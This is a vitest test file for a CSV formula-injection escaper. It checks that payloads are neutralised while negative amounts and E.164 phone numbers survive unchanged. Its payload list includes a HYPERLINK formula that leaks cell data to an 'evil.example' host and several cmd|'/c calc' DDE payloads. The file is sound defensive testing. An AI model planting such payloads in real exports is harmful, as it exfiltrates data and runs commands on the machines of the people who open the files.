/**
 * lib/security/csvInjection.test.ts — the escape must fire on payloads, and NEVER on real data
 *
 * Notes:  Two ways to fail, and the second is the dangerous one.
 *
 *           MISS      a formula reaches the file, and Excel runs it on the bookkeeper's machine.
 *           OVERREACH the escape fires on legitimate data — and the worst case there is `-6600.50`, a NEGATIVE
 *                     amount, which a naive check treats as a formula lead. That is the countermeasure that
 *                     introduces the vulnerability it defends against, and it is not hypothetical: the first
 *                     version of the import-side check did exactly that, and the poison harness caught it.
 *
 *         So the negative-number cases below are not padding. They are the point.
 */
import { describe, it, expect } from "vitest"
import { looksLikeFormula, neutraliseFormula, escapeCsvCell } from "./csvInjection"

describe("CSV injection — payloads are neutralised", () => {
  const PAYLOADS = [
    '=HYPERLINK("http://evil.example/?leak="&A1,"Click for refund")',
    "=1+1",
    // A signed lead followed by something that is NOT a number — still a formula. This is the line the
    // numeric guard must not blur: "+27821234567" is data, "+1+cmd|…" is an attack.
    "+1+cmd|'/c calc'!A0",
    "-1+cmd|'/c calc'!A0",
    "@SUM(1+9)*cmd|'/c calc'!A0",
    "\t=1+1",
    "\r=1+1",
  ]

  it.each(PAYLOADS)("detects %j as a formula", (payload) => {
    expect(looksLikeFormula(payload)).toBe(true)
  })

  it.each(PAYLOADS)("escapes %j so Excel will not execute it", (payload) => {
    const cell = escapeCsvCell(payload)
    // The value survives (we do not destroy the agency's data on export) but it can no longer be evaluated:
    // the leading apostrophe is the standard OWASP neutraliser.
    const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replaceAll('""', '"') : cell
    expect(unquoted.startsWith("'")).toBe(true)
    expect(looksLikeFormula(unquoted)).toBe(false)
  })

  it("strips the lead on the IMPORT side, where the row is validated anyway", () => {
    expect(neutraliseFormula('=HYPERLINK("x","y")')).toBe('HYPERLINK("x","y")')
    expect(neutraliseFormula("plain")).toBe("plain")
  })
})

describe("CSV injection — REAL DATA is never mangled", () => {
  // The overreach cases. A defence that corrupts money is worse than the attack it prevents.
  const REAL = [
    // NEGATIVE AMOUNTS. Stripping the minus flips them positive — the bug the poison harness caught.
    "-6600.50",
    "-1234",
    "-0.01",
    "-1 234,56",      // af-ZA negative

    // PHONE NUMBERS IN E.164 — the format every SA agency export emits. Stripping the plus leaves
    // "27821234567", which is neither local (082…) nor international, and every SMS and WhatsApp path
    // downstream then holds a number that reaches NOBODY.
    //
    // This suite originally covered the minus and NOT the plus: it tested the lead I had already fixed and
    // omitted the one that was still broken, so there was no test that could fail. The pre-PR walk found it.
    "+27821234567",
    "+27 82 123 4567",
    "+27-82-123-4567",
    "+1234",
    "+27 (82) 123 4567",
    "(6 600,50)",       // accounting negative

    "6600.50",
    "Smith",
    "Unit 3, Sea Point",
    "O'Brien",
  ]

  it.each(REAL)("does not treat %j as a formula", (value) => {
    expect(looksLikeFormula(value)).toBe(false)
  })

  it("a negative amount survives the round trip EXACTLY", () => {
    expect(escapeCsvCell("-6600.50")).toBe("-6600.50")
  })

  it("a comma in a property name quotes the cell instead of splitting the row", () => {
    // buildTrustLedgerCSV did not quote `property_name` at all: "Unit 3, Sea Point" split the row in two and
    // shifted every column after it. A silently misaligned financial export.
    expect(escapeCsvCell("Unit 3, Sea Point")).toBe('"Unit 3, Sea Point"')
  })

  it("an embedded quote is doubled, per RFC 4180", () => {
    expect(escapeCsvCell('He said "hi"')).toBe('"He said ""hi"""')
  })

  it("null and undefined become empty, not the string 'null'", () => {
    expect(escapeCsvCell(null)).toBe("")
    expect(escapeCsvCell(undefined)).toBe("")
  })
})
